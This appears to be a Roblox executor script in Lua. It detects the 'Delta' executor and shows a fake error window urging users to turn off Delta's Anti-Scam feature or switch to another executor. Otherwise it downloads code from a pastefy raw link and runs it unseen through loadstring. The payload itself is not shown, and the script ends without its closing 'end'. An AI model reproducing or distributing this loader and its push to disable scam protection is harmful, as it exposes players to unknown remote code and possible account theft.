local exec = tostring(identifyexecutor())

if exec == "Delta" then
    -- GUI Show
    local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
    ScreenGui.Name = "DeltaWarning"

    local MainFrame = Instance.new("Frame", ScreenGui)
    MainFrame.Size = UDim2.new(0, 400, 0, 220)
    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    MainFrame.BorderSizePixel = 0
    MainFrame.BackgroundTransparency = 0.1

    local UICorner = Instance.new("UICorner", MainFrame)
    UICorner.CornerRadius = UDim.new(0, 8)

    local Title = Instance.new("TextLabel", MainFrame)
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundTransparency = 1
    Title.Text = "ERROR Message"
    Title.TextColor3 = Color3.fromRGB(255, 0, 0)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 24

    local Subtitle = Instance.new("TextLabel", MainFrame)
    Subtitle.Position = UDim2.new(0, 0, 0, 40)
    Subtitle.Size = UDim2.new(1, 0, 0, 30)
    Subtitle.BackgroundTransparency = 1
    Subtitle.Text = "Delta Executor Detected"
    Subtitle.TextColor3 = Color3.fromRGB(255, 255, 0)
    Subtitle.Font = Enum.Font.GothamBold
    Subtitle.TextSize = 20

    local Body = Instance.new("TextLabel", MainFrame)
    Body.Position = UDim2.new(0, 10, 0, 70)
    Body.Size = UDim2.new(1, -20, 0, 80)
    Body.BackgroundTransparency = 1
    Body.TextWrapped = true
    Body.Text = "Your executor is blocked because Delta doesn't support this script.\n\nTo fix:\n- Turn off Anti-Scam in Delta\n- Or use Krnl or Codex"
    Body.TextColor3 = Color3.fromRGB(255, 255, 255)
    Body.Font = Enum.Font.Gotham
    Body.TextSize = 16

    local KRNL = Instance.new("TextButton", MainFrame)
    KRNL.Size = UDim2.new(0.45, 0, 0, 40)
    KRNL.Position = UDim2.new(0.05, 0, 1, -50)
    KRNL.Text = "Copy Krnl Link"
    KRNL.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
    KRNL.TextColor3 = Color3.fromRGB(255, 255, 255)
    KRNL.Font = Enum.Font.GothamBold
    KRNL.TextSize = 16

    local Codex = Instance.new("TextButton", MainFrame)
    Codex.Size = UDim2.new(0.45, 0, 0, 40)
    Codex.Position = UDim2.new(0.5, 0, 1, -50)
    Codex.Text = "Copy Codex Link"
    Codex.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
    Codex.TextColor3 = Color3.fromRGB(255, 255, 255)
    Codex.Font = Enum.Font.GothamBold
    Codex.TextSize = 16

    local Close = Instance.new("TextButton", MainFrame)
    Close.Size = UDim2.new(0, 30, 0, 30)
    Close.Position = UDim2.new(1, -35, 0, 5)
    Close.Text = "X"
    Close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
    Close.Font = Enum.Font.GothamBold
    Close.TextSize = 14

    Close.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)

    KRNL.MouseButton1Click:Connect(function()
        setclipboard("https://krnl.cat") -- Replace with actual link
    end)

    Codex.MouseButton1Click:Connect(function()
        setclipboard("https://codex.lol") -- Replace with actual link
    end)
else
    -- If not Delta, run your actual script
    loadstring(game:HttpGet("https://pastefy.app/meHAuiGw/raw"))()
